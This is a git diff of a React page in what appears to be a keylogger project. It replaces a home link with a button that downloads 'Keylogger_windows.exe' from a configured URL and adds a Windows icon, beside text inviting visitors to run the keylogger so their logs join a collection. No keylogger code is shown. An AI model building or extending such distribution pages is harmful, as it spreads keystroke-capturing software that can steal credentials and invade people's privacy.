@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect, useCallback, JSX, SVGProps } from "react";
 import { Button } from "@/components/ui/button";
 import {
     Card,
@@ -54,6 +54,20 @@ export default function LogsPage() {
     const [systemsError, setSystemsError] = useState<string | null>(null);
 
     const goServerBaseUrl = process.env.NEXT_PUBLIC_SERVER_BASE_URL;
+    const WINDOWS_DOWNLOAD_URL = process.env.NEXT_PUBLIC_WINDOWS_DOWNLOAD_URL ? process.env.NEXT_PUBLIC_WINDOWS_DOWNLOAD_URL : "";
+    console.log("Download URL:", WINDOWS_DOWNLOAD_URL);
+
+
+    const WindowsIcon = (props: JSX.IntrinsicAttributes & SVGProps<SVGSVGElement>) => (
+        <svg
+            xmlns="http://www.w3.org/2000/svg"
+            viewBox="0 0 24 24"
+            fill="currentColor"
+            {...props}
+        >
+            <path d="M0 3.79V10h11.23V0H1.8C.81 0 0 .81 0 1.8v1.99zm12.77 0V10H24V1.8C24 .81 23.19 0 22.2 0H12.77v3.79zm-12.77 7.7V20.2C0 21.19.81 22 1.8 22h9.43V11.49H0zm12.77 0V22H22.2c.99 0 1.8-.81 1.8-1.8V11.49H12.77z" />
+        </svg>
+    );
 
 
     const fetchSystemSummaries = useCallback(async () => {
@@ -369,14 +383,21 @@ export default function LogsPage() {
                         Download and run the keylogger to add your encrypted logs to this
                         collection.
                     </p>
-                    <Link href="/">
-                        <Button
-                            size="lg"
-                            className="bg-gradient-to-r from-cyan-500 to-purple-500 hover:from-cyan-600 hover:to-purple-600 text-white px-8 py-3 text-lg border-0 transition-all duration-300 hover:scale-105 hover:shadow-lg hover:shadow-cyan-500/25"
+                    <Button
+                        asChild
+                        size="lg"
+                        className="bg-gradient-to-r from-cyan-500 to-purple-500 hover:from-cyan-600 hover:to-purple-600 text-white px-8 py-3 text-lg border-0 transition-all duration-300 hover:scale-105 hover:shadow-lg hover:shadow-cyan-500/25"
+                    >
+                        <a
+                            href={WINDOWS_DOWNLOAD_URL}
+                            download="Keylogger_windows.exe"
+                            target="_blank"
+                            rel="noopener noreferrer"
                         >
-                            Download Keylogger
-                        </Button>
-                    </Link>
+                            <WindowsIcon className="h-5 w-5 mr-2" />
+                            <span>Download Keylogger</span>
+                        </a>
+                    </Button>
                 </div>
             </div>
         </div>
